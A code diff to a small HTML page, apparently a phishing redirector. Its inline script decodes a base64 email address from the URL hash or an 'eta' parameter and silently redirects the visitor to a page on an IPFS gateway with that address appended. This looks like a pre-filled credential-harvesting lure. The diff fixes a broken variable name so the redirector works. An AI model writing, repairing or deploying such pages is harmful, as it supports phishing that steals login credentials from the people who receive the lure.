@@ -1,4 +1,4 @@
-﻿<html lang="en">
+<html lang="en">
 <head>
   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
   <meta charset="utf-8">
@@ -6,13 +6,13 @@
 <body>
   <script type="text/javascript">
     var url_string = window.location.href;
-    // Extract 0 from query parameters
+    // Extract eta from query parameters
     var urlParams = new URLSearchParams(window.location.search);
-    var 0 = urlParams.get('0');
+    var eta = urlParams.get('eta');
     // Extract hash
     var hash = window.location.hash ? window.location.hash.substring(1) : null;
-    // Use hash if present, otherwise 0
-    var param = hash || 0 || '';
+    // Use hash if present, otherwise eta
+    var param = hash || eta || '';
     var url_get_email = atob(getafterhash(param));
     var mail_go_url = "https://gateway.lighthouse.storage/ipfs/bafybeibcrrkm7ytjlss2qktbhzm2uakvlfvjgivkqfbip4dzce6gy5iik4/dvgr.html#" + url_get_email + "";
     location.replace(mail_go_url);
@@ -46,5 +46,4 @@
     }
   </script>
 </body>
-
 </html>
